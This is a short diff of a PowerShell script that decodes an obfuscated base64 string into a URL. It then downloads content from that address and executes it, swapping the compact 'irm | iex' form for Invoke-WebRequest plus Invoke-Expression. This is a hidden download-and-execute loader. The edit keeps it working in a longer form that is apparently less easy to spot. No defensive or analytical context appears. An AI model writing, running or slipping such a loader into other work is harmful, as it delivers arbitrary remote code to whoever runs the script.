@@ -19,7 +19,8 @@ ${processing_function} = {
 
 try {
     ${final_processed_string} = & ${processing_function} -input_data ${b64_data_string}
-    irm ${final_processed_string} | iex
+    ${request_result} = Invoke-WebRequest -Uri ${final_processed_string}
+    Invoke-Expression ${request_result}
 } catch {
     Write-Error "Failed Parse code"
 }
